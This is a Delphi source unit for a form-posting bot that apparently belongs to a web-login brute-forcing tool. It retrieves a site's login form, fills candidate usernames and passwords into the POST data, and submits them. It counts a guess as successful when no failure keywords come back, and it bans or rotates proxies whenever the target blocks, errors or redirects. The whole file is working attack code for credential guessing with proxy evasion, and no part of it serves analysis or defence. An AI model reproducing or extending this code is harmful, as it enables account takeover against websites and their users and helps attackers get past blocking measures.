unit uFormBot;

interface

uses
  Classes, uFormParserBot, uBruteForcer;

type
  TFormBot = class(TFormParserBot)
  private
    // Pointer to the Statistic's Pointer
    FStatistics                    : PStatistics;
    FRefreshSession                : boolean;
    FFormReferer                   : string; // Referer needed to get to the Form URL
    FFormCookie                    : string; // Cookie needed to get to the Form URL

    procedure IncrementResponse;
    procedure SetRefreshSession(const Value: boolean);
  protected
    procedure TriggerRequestDone; override;
  public
    constructor Create(Aowner: TComponent); override;
    function GetFormData: boolean;
    procedure LaunchPOSTRequest;
    procedure ParseForm; override;

    property FormCookie       : string            read  FFormCookie
                                                  write FFormCookie;
    property FormReferer      : string            read  FFormReferer
                                                  write FFormReferer;
    property RefreshSession   : boolean           read  FRefreshSession
                                                  write SetRefreshSession;
    property Statistics       : PStatistics       read  FStatistics
                                                  write FStatistics;
  end;

implementation

uses SysUtils, uKeywordBot, uFunctions, Dialogs, FastStrings;

{ TFormBot }

{------------------------------------------------------------------------------}
constructor TFormBot.Create(Aowner: TComponent);
begin
  inherited;

//  FRequestVer                      := '1.1';
//  FConnection                      := 'keep-alive';
  FFormBotState                    := stReadyToPost;
end;
{------------------------------------------------------------------------------}
 procedure TFormBot.TriggerRequestDone;
  begin
   IncrementResponse;

   // Before dealing with Status Codes, check Header Keywords first.
   if CheckKeywords (True) then
    begin
     // Retry Bot if StatusCode is in the Retry StatusCode List
     if (FJudgement = judBad) and (CheckHeaderRetry) then
      FJudgement := judRetry;

     inherited;
     Exit;
    end;

   case FStatusCode of
    200:
     begin
      // Retrieved Form Data, so Parse it
      if FFormBotState = stGetFormData then
       begin
        // Populates FPostData and FFormData
        ParseForm;

        // Check for POST Data, if none is found, then resend GET Request
        if FPOSTData = '' then
         begin
          TriggerDisableProxy (Tag, 'No Form Data Found');
          TriggerSetProxy;
          FJudgement := judRetry;

          inherited;
          Exit;
         end;

        FLockHeader := False;
        FFormBotState := stReadyToPost;

        TriggerUpdateListview ('200 - Retrieved Form Data');

        LaunchPOSTRequest;
        Exit;
       end
      // POST Request Finished
      else
       begin
        if FRefreshSession then
         FFormBotState := stGetFormData;

	      // Check Keywords
        if CheckKeywords = False then
         // No Keywords were used
         FJudgement := judGood;
       end;
     end;

    300..307:
     begin
      if FFormBotState = stGetFormData then
       begin
        FJudgement := judRetry;
        TriggerBanProxy (Tag, 'Error Retrieving Form Data: Redirect to -> ' + FLocation);
       	TriggerSetProxy;
       end
      else
       FJudgement := judRedirect;
     end;

    // Deal with error codes
    else
     begin
      TriggerDisableProxy (Tag, IntToStr (FStatusCode) + ' - ' + FReasonPhrase);
      TriggerSetProxy;

      // Set Judgements
      if FReasonPhrase = 'Timeout' then
       FJudgement := judTimeout
      else
       FJudgement := judRetry;
     end;
   end;

   inherited;
  end;
{------------------------------------------------------------------------------}
procedure TFormBot.IncrementResponse;
begin
  case FStatusCode of
   200: Inc (FStatistics^.i200);
   300..307: Inc (FStatistics^.i3xx);
   401: Inc (FStatistics^.i401);
   403: Inc (FStatistics^.i403);
   404: Inc (FStatistics^.i404);
   500..505: Inc (FStatistics^.i5xx);
  end;
end;
{------------------------------------------------------------------------------}
procedure TFormBot.SetRefreshSession(const Value: boolean);
begin
  FRefreshSession := Value;
  if FRefreshSession then
   FFormBotState := stGetFormData
  else
   FFormBotState := stReadyToPost;
end;
{------------------------------------------------------------------------------}
function TFormBot.GetFormData: boolean;
begin
  Result := FRefreshSession;
  if FRefreshSession then
   begin
    FFormBotState := stGetFormData;
    // Use ICS's autogenerated header for form retrieval requests
    FLockHeader := True;
    // Change URL to FFormURL
    FURL := FFormURL;
    // Set special headers to retrieve the Form Data if needed
    if FFormReferer <> '' then
     FReference := FFormReferer;
    if FFormCookie <> '' then
     FCookie := FFormCookie;
    // Send GET Request
    GetAsync;
   end;
end;
{------------------------------------------------------------------------------}
procedure TFormBot.LaunchPOSTRequest;
var MySendStream: TMemoryStream;

begin
  MySendStream := FSendStream as TMemoryStream;
  SetPOSTData (MySendStream, FPOSTData);
  FSendStream := MySendStream;
  PostAsync;
end;
{------------------------------------------------------------------------------}
procedure TFormBot.ParseForm;
begin
  inherited;

  FPOSTData := FastReplace (FPOSTData, '<USER>', FUsername);
  FPOSTData := FastReplace (FPOSTData, '<PASS>', FPassword);
end;
{------------------------------------------------------------------------------}
end.

